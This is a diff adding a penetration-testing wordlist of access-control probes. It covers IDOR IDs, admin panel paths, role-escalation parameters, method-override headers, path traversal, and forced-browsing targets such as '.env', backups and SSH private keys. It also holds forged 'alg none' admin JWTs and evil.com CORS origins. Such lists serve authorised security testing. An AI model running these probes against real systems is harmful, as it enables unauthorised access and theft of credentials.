@@ -1,0 +1,179 @@
+# ── IDOR - Numeric ID Fuzzing ──
+/api/user/1
+/api/user/2
+/api/user/100
+/api/user/0
+/api/user/-1
+/api/users/1/profile
+/api/users/2/profile
+/api/orders/1
+/api/orders/2
+/api/invoice/1
+/api/invoice/2
+/api/account/1
+/api/account/2
+/api/document/1
+/api/document/2
+/api/file/1
+/api/file/2
+/api/ticket/1
+/api/ticket/2
+/api/message/1
+/api/message/2
+/api/payment/1
+/api/payment/2
+
+# ── IDOR - UUID/GUID Fuzzing ──
+/api/user/00000000-0000-0000-0000-000000000001
+/api/user/00000000-0000-0000-0000-000000000002
+/api/resource/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
+
+# ── Admin Panel Discovery ──
+/admin
+/admin/
+/admin/login
+/admin/dashboard
+/admin/panel
+/admin/console
+/admin/users
+/admin/config
+/admin/settings
+/administrator
+/administrator/
+/administrator/login
+/adminpanel
+/admin_area
+/admin_login
+/admin.php
+/admin.html
+/admin.asp
+/admin.aspx
+/admin/index.php
+/admin/home.php
+/admin/controlpanel.php
+/admin/cp.php
+/backend
+/backend/
+/backend/login
+/manage
+/manage/
+/management
+/management/
+/superadmin
+/superuser
+/root
+/moderator
+/webmaster
+/sysadmin
+/staff
+/staff/login
+/cpanel
+/wp-admin
+/wp-admin/
+/wp-login.php
+/joomla/administrator
+/drupal/admin
+/phpmyadmin
+/phpmyadmin/
+/pma
+/myadmin
+/mysql
+/mysqladmin
+/dbadmin
+/database
+
+# ── Privilege Escalation via Role Param ──
+?role=admin
+?role=administrator
+?role=superuser
+?role=root
+?isAdmin=true
+?isAdmin=1
+?admin=true
+?admin=1
+?user_type=admin
+?access=admin
+?privilege=admin
+?level=admin
+?group=admin
+?permission=admin
+
+# ── HTTP Method Override (Bypass) ──
+X-HTTP-Method-Override: PUT
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method-Override: PATCH
+X-Method-Override: PUT
+X-Method-Override: DELETE
+_method=PUT
+_method=DELETE
+_method=PATCH
+
+# ── Path Traversal to Restricted Areas ──
+/user/profile/../admin
+/user/profile/../../admin
+/api/v1/user/../admin/users
+/api/v1/../admin
+/app/user/../../admin/config
+
+# ── Forced Browsing - Sensitive Files ──
+/.git/config
+/.git/HEAD
+/.git/COMMIT_EDITMSG
+/.svn/entries
+/.svn/wc.db
+/.env
+/.env.local
+/.env.production
+/.env.backup
+/.env.bak
+/.htaccess
+/.htpasswd
+/web.config
+/config.php
+/config.yml
+/config.yaml
+/config.json
+/configuration.php
+/settings.php
+/settings.py
+/database.php
+/db.php
+/connection.php
+/wp-config.php
+/wp-config.php.bak
+/wp-config.php.old
+/backup.sql
+/backup.zip
+/backup.tar.gz
+/dump.sql
+/db_backup.sql
+/database.sql
+/site.sql
+/data.sql
+/users.sql
+/passwords.txt
+/credentials.txt
+/secrets.txt
+/private.key
+/id_rsa
+/.ssh/id_rsa
+/.ssh/authorized_keys
+/server.key
+/server.crt
+/ssl.key
+/ssl.crt
+
+# ── JWT / Token Manipulation ──
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+
+# ── CORS Abuse ──
+Origin: https://evil.com
+Origin: null
+Origin: https://trusted.com.evil.com
+Origin: https://evil.trusted.com
+
+# ── Referer Bypass ──
+Referer: https://trusted.com/admin
+Referer: https://localhost/admin
+Referer: https://127.0.0.1/admin
